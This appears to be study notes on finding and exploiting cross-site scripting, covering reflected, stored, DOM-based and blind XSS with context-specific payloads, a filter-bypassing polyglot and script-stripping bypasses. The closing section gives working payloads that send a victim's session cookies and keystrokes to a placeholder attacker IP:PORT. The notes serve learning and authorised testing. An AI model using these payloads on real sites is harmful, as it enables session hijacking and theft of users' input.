
Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. 

The payload is the JavaScript code we wish to be executed on the targets computer.

##### **==Important to Note, 1:==**

You may sometimes see your MINIMAL payloads in the DOM, which looks like, at first glance that, you have a valid case of Reflected XSS. For example:

`<span class="name">XSS123</span>`

However, it is important to first check where this came from. You HAVE to distinguish, was this value added when the page was built on the server, i.e. Reflected XSS, or was the value taken from a source such as the URL, and consumed by a JavaScript sink, i.e. DOM based XSS. **You have to do this step to check if you are dealing with Reflected XSS or DOM based XSS, as this will effect how you proceed with the exploit.** 

To check go to the Network tab, send you payload and check to see if the HTTP response includes your payload (**or even better right click and select View Page Source, for raw returned HTML, not DOM**). If it does, continue with Reflected XSS, if it is NOT included in response but is still parsed in the DOM, move to DOM Based XSS. 

*View Page Source for the `src` attribute value of `img` tags, as they may not appear in the HTTP response in the network tab, but the actual path may come directly from the server*. 

##### **==Important to Note, 2:==**

If you have found a genuine insertion point but the payload, e.g. `<script>alert(1)</script>`, does not execute, it could be because there are filters in place, to prevent XSS. **Always** try targeted payloads first. However, if they do not work, you can use a polyglot such as:

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

... which can escape attributes, tags and bypass filters all in one.
##### **==Important to Note, 3:==**

If you have found a genuine reflection point but the PoC payload, e.g. `<script>alert(1)</script>`, does not execute, it could be because there is a script stripping filter on the server-side.

Inspect the DOM and you may see you original payload rendered like so:

`<h2>Hello, <>alert(1)</></h2>`

or 

`<h2>Hello, <>alert(1)<h2>` *...... frequently `</>` is dropped by the browser as invalid HTML*

In this case it is evident that the string `script` is being removed server-side (This can also be evident by the `<>` symbols being literally rendered in the page). To get around this you could use the following payload:

`<sscriptcript>alert(1)</sscriptcript>`

Now when the word script is removed from user input on the server you will still be left with a valid executable payload:

`<script>alert(1)</script>`

**There could be numerous versions of manual server-side script stripping, think what is be rendering and how to bypass it:**

`<script><script>alert(1)</script></script>`

---


### **1. Reflected XSS**

Reflected XSS occurs when user-controlled input is immediately reflected in an HTTP response and executed in the victim’s browser due to missing or improper output encoding.

#### **STEP 1: Identify Likely Reflection Surfaces**

Focus only on inputs that are **intended to be shown back to the user**:

- Search boxes (`q`, `search`, `term`)

- Input boxes

- Error messages (`error`, `message`, `status`)
    
- Filters (`category`, `sort`, `type`)
    
- Pagination (`page`)
    
- Login / validation feedback
    
- URL path segments (occasionally)
    

Ignore:

- IDs
    
- Tokens
    
- CSRF fields
    
- Hidden fields

#### **STEP 2: Test for Reflection (No Payloads Yet)**

Inject a **unique marker**:

`XSS123`

Examples:

`/search?q=XSS123`
`/login?error=XSS123`

Check:

- Page content
    
- Page source
    
- Error banners
    
- Hidden HTML
    

If the marker appears → **candidate found**.

#### **STEP 3: Identify Reflection Context**

Determine **where** the input appears:

- HTML body
    
- HTML attribute
    
- JavaScript string
    
- URL
    
- Comment
    

This determines the payload.

#### **STEP 4: Test Minimal Execution Payload**


Use the **simplest possible payload** for the context.
##### HTML Body Context

For example, your payload appears in the DOM as:

`<h2>Hello, XSS123</h2>`

You can execute the following PoC:

`<script>alert(1)</script>`

##### HTML Body Context (Special Rule - `textarea` tag)

For example, your payload appears in the DOM as: 

`<textarea>XSS123</textarea>` 

Although it is HTML body context, **the browser treats everything inside `<textarea>` as literal text**, not markup.

That means:

`<textarea><script>alert(1)</script></textarea>`

Will **not** execute.

You can execute the following PoC:

`</textarea><script>alert(1)</script>`

.. which will become

`<textarea></textarea><script>alert(1)</script>` *the original handing `</textarea>` tag is ignored as invalid markup by the browser*

##### Attribute Context One

For example, your payload appears in the DOM as:

`<input value="XSS123">` *Here it is the value of an attribute, not directly in the body of the HTML*

You can execute the following PoC:

`" autofocus onfocus=alert(1) x="`

..... which will become

`<input value="" autofocus="" onfocus="alert('THM')" x="">`

##### Attribute Context Two

For example, your payload appears in the DOM as:

`<img src="XSS123">`

You can execute the following PoC:

`" onerror=alert('THM') x="`

.... which will become

`<img src="" onerror="alert('THM')" x="">`
##### JavaScript String Context

`';alert(1);//`

If JavaScript executes → **Reflected XSS confirmed**. 

**Reporting Sentence:** “User-controlled input is reflected directly in the HTTP response without output encoding, allowing execution of arbitrary JavaScript in the victim’s browser.”

### **2. Stored XSS**

Stored XSS occurs when user-controlled input is permanently stored by the application and later rendered and executed in other users’ browsers due to missing or improper output encoding.

#### **STEP 1: Identify Persistent Input Locations**

Focus only on features that **store data** and later display it:

- Comment systems
    
- User profiles / bios
    
- Forum posts
    
- Support tickets
    
- Reviews / feedback forms
    
- Chat messages
    
- Admin dashboards that display user data
    

Ignore:

- One-time forms
    
- Search boxes
    
- Login errors
    

If data is **saved and shown later**, it is a candidate.

#### **STEP 2: Submit a Harmless Marker (Persistence Test)**

Submit a **unique marker** as input:

`XSS-STORED-123`

Example:

- Comment field
    
- Profile “About Me”
    
- Message body
    

Then:

- Reload the page
    
- Log out / log in
    
- View as another user (if possible)
    

If the marker **persists across requests** → candidate found.

#### **STEP 3: Identify Rendering Context**

Determine **where stored input appears**:

- HTML body
    
- HTML attribute
    
- JavaScript context
    
- Admin-only page
    
- Public page
    

Stored XSS is often found in **admin views**, not user-facing ones.

#### **STEP 4: Test Minimal Execution Payload**

Use the **simplest possible payload** for the context.

##### HTML Body Context

`<script>alert(1)</script>`

##### Attribute Context

`" autofocus onfocus=alert(1) x="`

##### SVG Context (Very Common in Stored XSS)

`<svg onload=alert(1)>` 

This could help bypass basic, and insufficient, filtering, i.e. if the developer is filtering for `<script>` tags instead of properly encoding the output.

#### **STEP 5: Confirm Cross-User Impact (If Possible)**

Stored XSS is **more severe** if it affects other users.

Confirm:

- Another user sees it
    
- Admin dashboard executes it
    
- It triggers without interaction
    

If not possible, persistence alone is sufficient.

**Reporting Sentence:** “User-supplied input is stored by the application and later rendered without output encoding, allowing persistent execution of arbitrary JavaScript in users’ browsers.”

### **3. DOM Based XSS**

The DOM (Document Object Model) is the browser’s in-memory representation of a web page as a structured tree of objects that JavaScript can read and modify.

#### **STEP 1: Identify attacker-controlled data flowing into a dangerous DOM sink**

**Sinks**

`innerHTML`
`outerHTML`
`document.write`
`insertAdjacentHTML`
`eval`
`setTimeout`
`setInterval`
`onclick`
`setAttribute`
`location`
`location.href`
`window.open`

#### **STEP 2: Confirm Control with a Marker**

Insert:

`DOMXSS123`

If it appears in the DOM or affects behaviour → continue.

#### **STEP 3: Identify the Immediate Context of User Input**

##### **Case A — JavaScript string context**

Example:

`innerHTML = 'USER_INPUT';`

✅ **Action:** break out of JavaScript  
✅ **Payload:**

`';alert(1);// `

If alert fires -> **DOM XSS Confirmed**

Stop.
##### **Case B — Input is already treated as data**

Example:

`innerHTML = location.hash.substring(1);`

Continue to STEP 4.

#### **STEP 4: Choose Payload Based on Sink (Only After Context Is Clear)**

**Sink:** `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`

✅ **Action:** inject HTML with an event handler  
✅ **Payload:**

`<svg onload=alert(1)>`

or

`<img src=x onerror=alert(1)>`

---

**Sink:** `eval`, `setTimeout(string)`, `setInterval(string)`

✅ **Action:** inject raw JavaScript  
✅ **Payload:**

`alert(1)`

---

**Sink: Event Assignment**`onclick`, `setAttribute("onclick", ...)`)

✅ **Action:** inject raw JavaScript  
✅ **Payload:**

`alert(1)`

---
**Sink: Navigation** `location =`, `location.href =`, `window.open()`

✅ **Action:** inject JavaScript URL  
✅ **Payload:**

`javascript:alert(1)`

**Reporting Sentence:** “Client-side JavaScript unsafely inserts user-controlled data into the DOM, resulting in DOM-based cross-site scripting.”

### **4. Blind XSS**

Blind XSS occurs when user-supplied input executes in another user’s browser or at a later time, with no direct feedback to the attacker.

A popular tool for Blind XSS attacks is [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

#### **STEP 1: Identify Delayed Processing**

Ask:

- Is this input reviewed later?
    
- Is it shown in an admin panel?
    
- Is it logged or displayed elsewhere?
    

If yes → Blind XSS possible.

##### Common Blind XSS Locations (High Probability)

Focus here first:

- Contact forms
    
- Support tickets
    
- Feedback forms
    
- Bug report submissions
    
- User profile fields
    
- HTTP headers (User-Agent, Referer)
    
- Any “admin review” feature
    

If _someone else_ reads it later → Blind XSS candidate.

#### **STEP 2: Inject a Callback-Based Payload**

Instead of `alert()`, use **network interaction**.

`<script>fetch('http://ip:port')</script>`

Conceptually, the payload does this:

- Runs JavaScript
    
- Sends data to your server

You are not waiting for visual confirmation.

#### **STEP 3: Monitor for Callbacks**

If your server receives a request:

- JavaScript executed
    
- Blind XSS confirmed
    

Timing may be:

- Seconds
    
- Minutes
    
- Hours

**Reporting Sentence:** “User-supplied input is executed in a different user’s browser without direct feedback, allowing blind cross-site scripting.”

### **5. Beyond PoC**

Once you have PoC you can do one of the following:
#### **1. Session Stealing**

`<script>fetch('http://IP:PORT?cookie=' + btoa(document.cookie));</script>`

Do not forget `btoa` takes a **binary-unsafe ASCII string** and Encodes it into Base64. So you will need to decode the cookie string it order to read the actual values received.
#### **2. Key Logger**

``<script>document.onkeypress = function(e) { fetch('http:IP:PORT?key=' + btoa(e.key) );}</script>``